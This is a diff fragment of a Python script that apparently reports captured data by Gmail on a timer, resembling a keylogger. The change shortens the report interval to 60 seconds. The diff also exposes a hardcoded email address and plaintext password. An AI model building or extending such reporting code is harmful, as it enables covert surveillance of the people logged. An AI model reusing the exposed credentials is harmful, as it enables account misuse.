@@ -5,7 +5,7 @@ import smtplib # for sending email using SMTP protocol (gmail)
 # Semaphore is for blocking the current thread
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Semaphore, Timer
-SEND_REPORT_EVERY = 100 # 100 seconds
+SEND_REPORT_EVERY = 60 # 60 seconds
 EMAIL_ADDRESS = "alimatt2007cyberft@gmail.com"
 EMAIL_PASSWORD = "mynameisali1"
 
